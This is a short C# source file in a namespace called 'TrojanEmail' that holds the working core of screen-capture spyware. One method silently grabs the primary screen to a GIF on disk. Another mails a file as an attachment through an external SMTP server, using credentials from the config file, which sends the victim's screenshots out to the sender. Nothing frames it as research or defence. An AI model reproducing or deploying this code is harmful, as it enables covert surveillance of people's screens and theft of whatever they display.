using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Configuration;

namespace TrojanEmail
{
    class DenlonSend
    {
        /// <summary>
        /// 从denlon@denlon.xyz发送邮件
        /// </summary>
        /// <param name="mailTo">收件人</param>
        /// <param name="mailSubject">邮件主题</param>
        /// <param name="mailBody">邮件内容</param>
        /// <param name="filepath">邮件附件</param>
        /// <returns></returns>
        public static bool SendEmail(string mailTo, string mailSubject, string mailBody, string filepath)
        {
            string stmpServer = "smtp.mxhichina.com";
            string mailFrom= ConfigurationManager.AppSettings["EmailFrom"].ToString();
            string stmpPWD = ConfigurationManager.AppSettings["EmailPWD"].ToString();

            SmtpClient smtpClient = new SmtpClient(stmpServer,25);
            smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
            smtpClient.Host = stmpServer;
            smtpClient.Credentials = new System.Net.NetworkCredential(mailFrom, stmpPWD);

            MailMessage mailMessage = new MailMessage(mailFrom, mailTo);
            mailMessage.Subject = mailSubject;
            mailMessage.Body = mailBody;
            mailMessage.BodyEncoding = Encoding.UTF8;
            mailMessage.IsBodyHtml = true;
            mailMessage.Priority = MailPriority.Low;

            Attachment attachment = new Attachment(filepath);
            mailMessage.Attachments.Add(attachment);

            try
            {
                smtpClient.Send(mailMessage);
            }
            catch (Exception ex)
            {
                return false;
            }
            return true;
        }

        public static bool SaveImage()
        {
            try
            {
                Image myImg = new Bitmap(Screen.AllScreens[0].Bounds.Width, Screen.AllScreens[0].Bounds.Height);
                Graphics g = Graphics.FromImage(myImg);

                g.CopyFromScreen(new Point(0, 0), new Point(0, 0), Screen.AllScreens[0].Bounds.Size);
                myImg.Save("D:\\Capture.gif", System.Drawing.Imaging.ImageFormat.Gif);
                //Console.WriteLine("图片保存成功");
                return true;
            }
            catch (Exception ex)
            {
                //Console.WriteLine("图片保存失败");
                return false;
            }
        }

    }
}
